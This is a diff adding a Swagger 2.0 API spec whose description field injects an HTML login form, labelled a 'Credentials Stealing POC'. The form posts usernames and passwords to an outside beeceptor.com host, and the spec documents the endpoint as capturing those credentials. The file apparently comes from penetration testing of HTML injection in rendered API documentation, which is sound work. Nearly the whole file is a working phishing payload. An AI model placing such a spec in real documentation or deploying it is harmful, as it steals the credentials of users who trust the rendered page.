@@ -1,0 +1,48 @@
+swagger: '2.0'
+info:
+  version: 1.0.0
+  title: Fake Login Page
+  description: >
+    <div class="login-form">
+      <div class="heading">
+        <h1>Credentials Stealing POC : Fake Login</h1>
+      </div>
+      <div class="form-container">
+        <form action="https://vinothpentest.free.beeceptor.com/login" method="post" class="form-signin">
+          <div class="form-group">
+            <label for="username">Username</label>
+            <input type="text" id="username" name="username" size="20" required>
+          </div>
+          <div class="form-group">
+            <label for="password">Password</label>
+            <input type="password" id="password" name="password" size="20" required>
+          </div>
+          <div class="form-group">
+            <button type="submit" class="btn btn-default">Login</button>
+          </div>
+        </form>
+      </div>
+    </div>
+paths:
+  /:
+    post:
+      summary: Fake login endpoint
+      description: This endpoint captures login credentials submitted via the form.
+      consumes:
+        - application/x-www-form-urlencoded
+      parameters:
+        - name: username
+          in: formData
+          required: true
+          type: string
+          description: The username entered in the fake login form.
+        - name: password
+          in: formData
+          required: true
+          type: string
+          description: The password entered in the fake login form.
+      responses:
+        '200':
+          description: Login successful
+        '400':
+          description: Bad request - invalid input
